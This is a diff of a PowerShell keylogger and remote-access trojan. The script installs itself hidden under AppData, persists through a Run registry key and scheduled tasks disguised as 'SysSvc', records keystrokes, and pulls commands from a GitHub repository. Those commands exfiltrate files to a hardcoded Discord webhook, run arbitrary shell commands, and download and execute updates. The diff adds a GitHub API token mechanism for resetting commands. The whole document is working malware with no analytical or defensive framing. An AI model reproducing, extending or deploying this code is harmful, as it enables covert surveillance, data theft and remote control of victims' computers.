@@ -3,25 +3,31 @@ $ErrorActionPreference = "SilentlyContinue"
 
 # ===================== CONFIG =====================
 $hook    = "https://discord.com/api/webhooks/1574502039323545742/FGJ91Pysy7zdQwD64rLOfrSyMa9-c5o-g8_29n5sEqzLr2KS96o9sWrPx5Zp7uY3ukUt"
-$cmdUrl  = "https://raw.githubusercontent.com/Capyvests/office-365/main/cmd.txt"
-$boot    = "https://raw.githubusercontent.com/Capyvests/office-365/main/k.ps1"
-$shutSrc = "https://raw.githubusercontent.com/Capyvests/office-365/main/shut.ps1"
+$repo    = "Capyvests/office-365"
+$br      = "main"
+$tok     = "github_pat_COLA_AQUI"
 # ==================================================
+
+$cmdUrl  = "https://raw.githubusercontent.com/$repo/$br/cmd.txt"
+$boot    = "https://raw.githubusercontent.com/$repo/$br/k.ps1"
+$shutSrc = "https://raw.githubusercontent.com/$repo/$br/shut.ps1"
+$api     = "https://api.github.com/repos/$repo/contents/cmd.txt"
+$hj      = @{ Authorization = "Bearer $tok"; "User-Agent" = "svc"; Accept = "application/vnd.github+json" }
 
 $dir  = "$env:APPDATA\Microsoft\WinSvc"
 $self = "$dir\k.ps1"
 $log  = "$dir\svc.log"
 $posF = "$dir\pos.txt"
 $shut = "$dir\shut.ps1"
-$tr   = "powershell -w hidden -ep bypass -f `"$self`""
-$trS  = "powershell -w hidden -ep bypass -f `"$shut`""
+$tr   = "powershell -w hidden -nop -ep bypass -f `"$self`""
+$trS  = "powershell -w hidden -nop -ep bypass -f `"$shut`""
 
 $mtx = New-Object Threading.Mutex($false, "WinSvcMtx")
 if (-not $mtx.WaitOne(0)) { exit }
 
 New-Item -ItemType Directory $dir -Force | Out-Null
 if ($PSCommandPath -and $PSCommandPath -ne $self) { Copy-Item $PSCommandPath $self -Force }
-if (-not (Test-Path $self)) { iwr $boot -OutFile $self }
+if (-not (Test-Path $self)) { curl.exe -s -o $self $boot }
 if (-not (Test-Path $posF)) { Set-Content $posF "0" }
 $pos = [int](Get-Content $posF)
 
@@ -29,7 +35,7 @@ if (-not $Test) {
   Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value $tr
   schtasks /create /tn SysSvc   /tr $tr  /sc onlogon      /f 2>$null
   schtasks /create /tn SysSvcW  /tr $tr  /sc minute /mo 5 /f 2>$null
-  if (-not (Test-Path $shut)) { iwr $shutSrc -OutFile $shut }
+  if (-not (Test-Path $shut)) { curl.exe -s -o $shut $shutSrc }
   schtasks /create /tn SysSvcS1 /tr $trS /sc onevent /ec System /mo "*[System/EventID=6006]" /f 2>$null
   schtasks /create /tn SysSvcS2 /tr $trS /sc onevent /ec System /mo "*[System/EventID=1074]" /f 2>$null
 }
@@ -57,8 +63,17 @@ function Flush {
   Set-Content $posF $pos
 }
 
+function ResetCmd($txt) {
+  if (-not $tok -or $tok -like "*COLA_AQUI*") { return }
+  try {
+    $j = Invoke-RestMethod $api -Headers $hj -TimeoutSec 8
+    $b = @{ message = "reset"; content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($txt)); sha = $j.sha; branch = $br } | ConvertTo-Json
+    Invoke-RestMethod $api -Method Put -Headers $hj -Body $b -TimeoutSec 12 | Out-Null
+  } catch { Send "[aviso] nao consegui repor o cmd.txt" }
+}
+
 function Uninstall {
-  Send "[i] UNINSTALL — a limpar"
+  Send "[ok] uninstall — a limpar"
   foreach ($t in "SysSvc","SysSvcW","SysSvcS1","SysSvcS2") { schtasks /delete /tn $t /f 2>$null }
   Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc 2>$null
   Start-Process powershell -w hidden -ArgumentList "-ep bypass -c Start-Sleep 4; Remove-Item -Recurse -Force '$dir'"
@@ -72,34 +87,84 @@ public class K { [DllImport("user32.dll")] public static extern short GetAsyncKe
 "@
 $map  = @{ 8='[BK]'; 9='[TAB]'; 13="`n"; 32=' '; 46='[DEL]'; 27='[ESC]' }
 $prev = New-Object 'bool[]' 256
-$logOn = $true
 $ultimo = ""
 $tUlt   = Get-Date
 
 while ($true) {
   try {
-    $c = (Invoke-WebRequest "$cmdUrl`?v=$([DateTime]::UtcNow.Ticks)" -UseBasicParsing -TimeoutSec 8).Content.Trim()
+    $c = (Invoke-WebRequest "$cmdUrl`?v=$([DateTime]::UtcNow.Ticks)" -UseBasicParsing -TimeoutSec 8).Content
     if ($c -and $c -ne $ultimo) {
       $ultimo = $c
+
+      $cfg = @{}
       foreach ($l in ($c -split "`n")) {
-        $l = $l.Trim(); if (-not $l) { continue }
-        try {
-          switch -Regex ($l) {
-            '^log off'      { $logOn = $false; Send "[i] log OFF" }
-            '^log on'       { $logOn = $true;  Send "[i] log ON" }
-            '^dump$'        { Flush; Send "[i] dump concluido" }
-            '^info$'        { Send "[i] info`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)`nUptime: $((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime)`nIP: $((Get-NetIPAddress -AddressFamily IPv4 | ? {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress)" }
-            '^ls (.+)'      { Send "[i] ls $($matches[1])`n$((Get-ChildItem $matches[1] | Select -First 40 Name,Length | Out-String))" }
-            '^get (.+)'     { $f=$matches[1]; $f2="$env:TEMP\g.txt"; Get-Content $f -Raw | Set-Content $f2 -Encoding UTF8; curl.exe -s -F "content=**get** $f" -F "files[0]=@$f2" $hook }
-            '^sh (.+)'      { Send "[i] sh`n$((Invoke-Expression $matches[1] 2>&1 | Out-String))" }
-            '^shut$'        { & $shut; Send "[i] teste de encerramento" }
-            '^webhook (.+)' { $hook = $matches[1]; Send "[i] webhook alterado" }
-            '^update$'      { Send "[i] update"; iwr $boot -OutFile $self; iwr $shutSrc -OutFile $shut; Start-Process powershell -w hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
-            '^uninstall$'   { Uninstall }
-            default         { Send "[i] ? $l" }
-          }
-        } catch { Send "[e] $l -> $_" }
+        if ($l -match '^\s*#') { continue }
+        if ($l -match '^\s*([a-z_]+)\s*=\s*(.*?)\s*$') { $cfg[$matches[1]] = $matches[2] }
       }
+      function Flag($n) { $cfg[$n] -eq "1" }
+
+      if ($cfg.ContainsKey("log")) { }
+
+      if (Flag "log") { } # tratado no fim
+
+      if (Flag "info") {
+        try { Send "[ok] info`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)`nUptime: $((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime)`nIP: $((Get-NetIPAddress -AddressFamily IPv4 | ? {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress)" }
+        catch { Send "[falhou] info :: $_" }
+      }
+
+      if (Flag "dump") {
+        try { Flush; Send "[ok] dump" } catch { Send "[falhou] dump :: $_" }
+      }
+
+      if (Flag "ls") {
+        try {
+          if (-not $cfg["ls_path"]) { throw "ls_path vazio" }
+          Send "[ok] ls $($cfg['ls_path'])`n$((Get-ChildItem $cfg['ls_path'] | Select -First 40 Name,Length | Out-String))"
+        } catch { Send "[falhou] ls :: $($cfg['ls_path']) :: $_" }
+      }
+
+      if (Flag "get") {
+        try {
+          if (-not $cfg["get_path"]) { throw "get_path vazio" }
+          if (-not (Test-Path $cfg["get_path"])) { throw "nao existe" }
+          $f2 = "$env:TEMP\g.txt"
+          Get-Content $cfg["get_path"] -Raw | Set-Content $f2 -Encoding UTF8
+          curl.exe -s -F "content=**ok** get $($cfg['get_path'])" -F "files[0]=@$f2" $hook | Out-Null
+          Send "[ok] get $($cfg['get_path'])"
+        } catch { Send "[falhou] get :: $($cfg['get_path']) :: $_" }
+      }
+
+      if (Flag "sh") {
+        try {
+          if (-not $cfg["sh_cmd"]) { throw "sh_cmd vazio" }
+          Send "[ok] sh`n$((Invoke-Expression $cfg['sh_cmd'] 2>&1 | Out-String))"
+        } catch { Send "[falhou] sh :: $($cfg['sh_cmd']) :: $_" }
+      }
+
+      if (Flag "shut") {
+        try { & $shut; Send "[ok] shut" } catch { Send "[falhou] shut :: $_" }
+      }
+
+      if (Flag "webhook") {
+        try {
+          if (-not $cfg["webhook_url"]) { throw "webhook_url vazio" }
+          $hook = $cfg["webhook_url"]; Send "[ok] webhook alterado"
+        } catch { Send "[falhou] webhook :: $_" }
+      }
+
+      if (Flag "update") {
+        try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $shut $shutSrc; Start-Process powershell -w hidden -ArgumentList "-nop -ep bypass -f `"$self`""; exit }
+        catch { Send "[falhou] update :: $_" }
+      }
+
+      # estado log
+      if ($cfg["log"] -eq "1") { $logOn = $true } elseif ($cfg["log"] -eq "0") { $logOn = $false }
+
+      if (Flag "uninstall") { Uninstall }
+
+      # repor flags a 0, mantendo os valores
+      $novo = $c -replace '(?m)^(info|dump|ls|get|sh|shut|webhook|update|uninstall)=1\s*$', '$1=0'
+      if ($novo -ne $c) { ResetCmd $novo; $ultimo = $novo }
     }
   } catch {}
 
